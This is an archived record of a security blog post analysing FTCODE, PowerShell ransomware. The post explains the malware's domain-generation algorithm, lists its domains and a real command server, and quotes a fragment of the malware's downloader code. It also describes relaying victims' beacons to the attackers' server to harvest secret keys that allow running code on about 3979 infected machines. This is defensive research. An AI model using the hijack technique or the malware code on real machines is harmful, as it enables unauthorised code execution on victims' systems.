{
    "id": "5382a6d4-af3b-4d10-af44-28eb43bb5d4a",
    "created_at": "2023-01-12T15:09:30.710941Z",
    "updated_at": "2025-03-27T02:06:04.789501Z",
    "deleted_at": null,
    "sha1_hash": "acbd81e27ddd181655f203a99872741a9ba2ad0e",
    "title": "2020-01-21 - FTCODE- taking over (a portion of) the botnet",
    "authors": "",
    "file_creation_date": "2022-05-28T04:06:02Z",
    "file_modification_date": "2022-05-28T04:06:02Z",
    "file_size": 1758584,
    "plain_text": "# FTCODE: taking over (a portion of) the botnet\n\n**[kpn.com/security-blogs/FTCODE-taking-over-a-portion-of-the-botnet.htm](https://www.kpn.com/security-blogs/FTCODE-taking-over-a-portion-of-the-botnet.htm)**\n\nA while ago we got our hands on an interesting malware sample. The sample was\ninteresting to us for multiple reasons. On one hand it was a ransomware variant written fully\nin PowerShell. On the other hand, it contacted multiple domains which were not registered.\nThe following domains were contacted by the sample:\n\nagvlmtkxmtq2.top\nahmwmtkxmtq2.top\namq1mtkxmtq2.top\nbxfmmtkxmtq2.top\nehuxmtkxmtq2.top\n\nLooking at the above domains, we got the feeling that they were possibly automatically\ngenerated. A malware sample that tries to reach out a domain that is not registered is\npossibly interesting while doing malware research, because the malware might send\ninteresting information to that domain. The security research team of KPN recognized the\nsample as FTCODE and decided to register one the domains. This blog contains all\ninformation of our FTCODE analysis :).\n\n## How is FTCODE being delivered to victims?\n\nA message on Twitter indicate that the FTCODE ransomware was spotted on the 23th of\nSeptember in 2019 for the first time in Italy. The first samples that we could find in public\nsandboxes are from the 1st of October 2019.\n\nAnalyzing the public sandboxes show that FTCODE mainly has been served by using two\nwell-known techniques. The first one is by sending a document to victims containing a\n[malicious macro. The macro starts PowerShell code to start FTCODE. The following](https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware)\nscreenshot is an example of a document that has been used:\n\n\n-----\n\nAnother method we have seen is using VBS files to drop the malware. The VBS scripts\nlaunches PowerShell (the payload) and opens a file to mislead the user, such as a MP3 file\nor a JPG file:\n\n**Domain Generation Algorithm (DGA)**\n\nThe domains we found seemed to contain some interesting pattern. We downloaded the\ncode and searched for the code polling our domain. After diving into the code it became\n[clear that a simple domain generating algorithm (DGA) was used. The following code was](https://en.wikipedia.org/wiki/Domain_generation_algorithm)\nused:\n\n\n-----\n\nIn the above code, a DGA is available which generates a domain based on the following\nelements:\n\na)   a string \"hee\", \"xu1\", \"hs0\", \"jd5\" or \"mqf\"\n\nb)   the current date using the PowerShell function Get-Date -UFormat “%y%m%V”\n\nThe above values elements are concatenated, converted to bytes and encoded with\nbase64. The “.top” top level domain is added to make it a valid .top domain. For example,\nthe DGA would generate the following domains for week 46 in 2019:\n\nagvlmtkxmtq2.top (hee191146)\nehuxmtkxmtq2.top (xu1191146)\nahmwmtkxmtq2.top (hs0191146)\namq1mtkxmtq2.top (jd5191146)\nbxfmmtkxmtq2.top (mqf191146)\n\nThe DGA allowed us to generate many sinkhole domains in advance. We decided to\nregister a few of them for multiple weeks. We registered the first .top domain generated\n(“hee”) by the code, so we can use those domains to catch interesting information.\n\nThere is one surprising thing here. Due to the padding of base64, the domain generation in\n[the first 9 weeks of 2020 will fail. The documentation of PowerShell 5.1 states that Get-Date](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-date?view=powershell-5.1)\n%V will return “01”. However, in reality it returns for some unknown reason “1”. Therefore,\nbase64 padding is added to the domain name, resulting in the following domain being\ngenerated by the script: “agvlmjawmte=.top”. It is impossible to register a domain with the\n“=” character. In week 10 (March 2020), the DGA will work again.\n\n**Sinkhole**\n\nWe have control over the .top domains, but what kind of information is being send to\nthesedomains? By analyzing the code, it became clear that the code is first trying to reach\nout the main command and control server (C2) The screenshot above shows that for this\n\n\n-----\n\nsample the C2 is the domain indu.rkeindustries.com. If it succeeds contacting this domain, it\nwill only communicate to this domain. However, if it fails to contact this domain, it will fall\nback to the DGA domains, until one of them is reachable.\n\n_In other words: only the bots that lost contact with the main C2 of the attackers will contact_\n_our sinkhole. It seems the mechanism is there for the botnet owners to manage their_\n_network in the case their C2 is taken down._\n\nSo, what is in those requests from the bots? We have seen different data being sent\ndepending on the situation. But mainly we received POST-request from different IPaddresses containing a base64 encoded string, an example request in JSON format:\n```\n{\"datetime\":\"Mon Nov 25 15:04:35:000\n2019\",\"clientip\":\"93.x.x.x\",\"serverport\":\"80\",\"request_method\":\"POST\",\"request_uri\":\"\n{\"Host\":\"agvlmtkxmtq4.top\",\"Expect\":\"100-continue\",\"Connection\":\"keepalive\"},\"body\":\"l=dj0xMDI5LjQmZ3VpZD0wOGIzZDc3OC1mNzJjLTRlODYtYWUyMy02MzI3M2M3YWI1YTg\n\n```\nAfter decoding the data, we determined the following information:\n```\nv=1029.4&guid=08b3d778-f72c-4e86-ae2363273c7ab5a8&error=sendpost2:http://agvlmtkxmtq4.top/::Eccezione durante la chiamata\ndi \"Substring\" con \"2\" argomento/i: \"Index e length devono fare riferimento a una\nposizione nella stringa.\nNome parametro: length\"\n\n```\nThe variable “v” contains the version of the bot. A lot of samples are available with different\nversion numbers. Also, a GUID is sent to us. This is an interesting value as the GUID is\nused on a lot of parts within the attack, which we will explain later on. It is the unique\nidentifier of the victim. Next to this, an exception message is embedded within the request.\n\nIn some situations, the base64 contained a register call. The bots try to register itself on our\nbackup C2 instead of the attackers C2. The attackers C2 might be already blocked by a\nsecurity measurement such as an Intrusion Prevention System (IPS). The following\nexample shows a register call:\n```\nv=927.1&guid=&status=register&ssid=&os=10.0.15063.1387&psver=5&comp_name=LAPTOP4PR702DQ&domen=http://agvlmtkxmtq4.top/\n\n```\nThis request contains some other interesting information such as a PowerShell version and\ncomputer name. By importing all the information in an ELK instance, we were able to get\ngreat insights into the malware activity. Below is data from 25 November 2019 until theth\n30 of November 2019:th\n\n\n-----\n\nAbove screenshot shows a timeline of all traffic between 25 November 2019 and 30\nNovember 2019. There is an interesting spike in above timeline. Possibly we have an\nexplanation for this spike: only the bots are connecting to our sinkhole if they are unable to\nreach the attackers C2. Possibly, the C2 of the attackers was down for a while\n(maintenance?), which resulted in the bots connecting to us instead of the real C2.\n\nThese stats show the total of unique IP-addresses we have seen during the same period,\nand the different versions of samples contacting our sinkhole.\n\nAbove pie shows the countries where the bots are connecting from. By manual analyzing\nthe IP-addresses, we have seen different type of companies that are infected by FTCODE,\nsuch as (all in Italy):\n\n-   Banks\n\n-   Energy companies\n\n\n-----\n\n-   Hospitals\n\n-   Government\n\n-   …\n\nThe infection map of Italy, based on Geo IP information.\n\n**Attackers C2**\n\nOne of the behaviors we noticed during the analysis is that the C2 server of the attackers is\nchanging domains regularly. Also, the web services behind the domains were unreachable\nreally quickly. We have seen cases where new samples came available pointing a new\ndomain, the web server behind the new domain that was used was offline within a few\nhours.\n\nAfter a while, we infected one of our machines. The interesting thing is that this machine\nwas still able to reach the domains that went offline in the past. In other words, the attackers\nare using IP-filters to allow already infected victims to connect to their C2. Other clients are\nignored / blocked by the IP-filter. This is possibly a way to hide the C2, or mislead\nresearchers to let them think the C2’s is down?\n\nDuring our analysis we were not able to reach the C2 of the attackers multiple times in a\nshort time. Possibly, they implemented a banning mechanism that blocks IP’s whenever\nclients have unexpected behavior. For example, we tried to contact all the C2 domains from\nour infected machine in a short time, which resulted in the C2 becoming unavailable. Most\nlikely they detected this behavior and blocked our IP.\n\n**Taking over the bots**\n\nBy analyzing the code, we noticed that a computer infected with FTCODE is continuously\npolling the attackers C2, and if that fails it will try to contact our sinkhole C2. The contacted\nC2 is able to return a client specific secret key and a piece of PowerShell code. If the secret\n\n\n-----\n\nkey is correct, the PowerShell will get executed. The following code is performing the\npolling, and executing the PowerShell if the response is correct:\n\nWe contacted the attackers C2 to see how a payload exactly looks like. The returned value\nwas a base64 value, after decoding the following value appeared:\n\nAbove response of the real C2 confirms our code analysis, a secret is required, and a piece\nof PowerShell is passed by the C2.\n\nSo, how is the secret that is sent by server validated? We dived in the code to see how the\nsecret mechanism works. It became clear that whenever a payload is received by the\nserver, the first 16 characters are compared with a value within the “thumbcache” TXT-file. If\nthe values are equal, the PowerShell code is executed.\n\nAnd are we able to obtain the secrets of all those other bots? We have a sinkhole, that is\nbeing contacted by 1000’s of bots. Like earlier mentioned, they are contacting our C2 with\ninformation such as the version and GUID. We tried to forward all the information that is\nbeing sent to us to the real C2 (C2 in the middle :D), in the hope we would receive the\nsecret and the PowerShell code that is there for the infected machine ready for being\nexecuted. The post data forwarded to the real C2:\n```\nl=dj0xMDI5LjQmZ3VpZD0yN2VjNjJmMy1iMzc4LTRkMTQtYTgyYi0wYTk2NmY2ODQ4NGEmJmRvbWVuPWh0dHA\n\n```\nBase64 Decoded version:\n```\nv=1029.4&guid=27ec62f3-b378-4d14-a82b-0a966f68484a&&domen=http://agvlmtkxmtq2.top/\n\n```\n\n-----\n\nThis resulted in getting the infected machine specific secret and the PowerShell code being\nready at the real C2. We can conclude that we can forward all the polling requests reaching\nour sinkhole to the real C2 server of the attackers, to disclose the secret keys. WIN! After\nobtaining all the secret keys, we could execute PowerShell code on all the machines trying\nto contact our sinkhole, by returning the infected machine secret followed by any piece of\nPowerShell we want to execute.\n\n**Ok, but let’s do it then!**\n\nLet’s test this theory, because there might be a condition that tackles it. First of all, we need\nto obtain the secret from the attackers C2 for our bot. We filtered our sinkhole logs on our\ninfected machine IP-address and found that the machine is sending the following request:\n```\n{\"datetime\":\"Tue Nov 26 12:07:39:000\n2019\",\"clientip\":\"45.x.x.x\",\"serverport\":\"80\",\"request_method\":\"POST\",\"request_uri\":\"\n{\"Host\":\"agvlmtkxmtq4.top\",\"Expect\":\"100-continue\",\"Connection\":\"KeepAlive\"},\"body\":\"l=dj0xMDI5LjYmZ3VpZD1iN2E3NDljYy02MzhhLTRlNDQtOWRhYy03NWE0Yzc5NDIxMzc\n\n```\nAfter forwarding this request to the attackers C2, we were able to obtain the secret from the\nresponse:\n```\n680a708fee2a45e1function sctevhwbca{\n $jhhabve = $env:PUBLIC + \"\\Libraries\"\n $tthzshyvv = $env:temp + \"\\AFX50058.tmp\";\n if (-not (Test-Path $jhhabve)) { md $jhhabve; }\n $jvysuid = $jhhabve + \"\\WindowsIndexingService.vbs\";\n $hxbgvwji = New-Object System.Net.WebClient;\n\n```\nAfter getting the secret, we modified our sinkhole to reply with a specific payload whenever\nthe IP-address of our infected machine contacts our sinkhole. This prevents other bots\nfrom executing our code. The code:\n\nAbove payload contains the following text:\n```\n680a708fee2a45e1New-Item -Path \"C:\\Users\\Administrator\\Desktop\\\" -Name\n\"Takeover.txt\" -ItemType \"file\" -Value \"TookItOver\"\n\n```\nIf executed correctly, the PowerShell script creates a file on the desktop of our infected\nmachine. After a few minutes the file appeared on our desktop which confirms that we were\nable to execute the code using our sinkhole domain:\n\n\n-----\n\nWe have proven that we were able to execute code on our own machine by using the\nsecret. So how realistic is it to obtain the keys from all other infected machines? We\ngathered POST-requests from infected machines for a few weeks and wrote a script to\nforward those to the real attackers C2, to store the response and obtain their secret keys\nand PowerShell ready to be executed. We stored all that information in a database, so we\nhave an overview of this information:\n\nTo prevent being banned by the real C2, we delayed all the requests by one minute. We\nrequested the secret keys of a total of 4307 infected machines. We successfully received\nsecret keys from 3979 machines J. In other words, we are able to inject PowerShell into\n**3979 infected machines by using the secret keys.**\n\n**Conclusion**\n\n\n-----\n\nIt was fun diving into FTCODE because it is fully PowerShell based malware. The results of\nour investigation could be used to take down the network, by removing the malware from all\nthe infected machines.\n\nAlso, FTCODE is a great example that ransomware is not always just ransomware. An\nattacker does have persistence access to all the infected machines part of the botnet, which\nis equal to network access to lots of company networks (financial, government etc). The\naccess could be used to further penetrate a network, and to perform a more company\nspecific ransomware attack. These kinds of attacks are rapidly increasing nowadays. For\nexample, the REvil ransomware is used those attacks, asking huge amounts of ransom\nmoney, depending on the company that’s being attacked:\n[https://twitter.com/rikvduijn/status/1214268406704300032](https://twitter.com/rikvduijn/status/1214268406704300032)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-21 - FTCODE- taking over (a portion of) the botnet.pdf"
    ],
    "report_names": [
        "2020-01-21 - FTCODE- taking over (a portion of) the botnet.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536170,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 1653710762,
    "ts_modification_date": 1653710762,
    "files": {
        "pdf": "https://archive.orkl.eu/acbd81e27ddd181655f203a99872741a9ba2ad0e.pdf",
        "text": "https://archive.orkl.eu/acbd81e27ddd181655f203a99872741a9ba2ad0e.txt",
        "img": "https://archive.orkl.eu/acbd81e27ddd181655f203a99872741a9ba2ad0e.jpg"
    }
}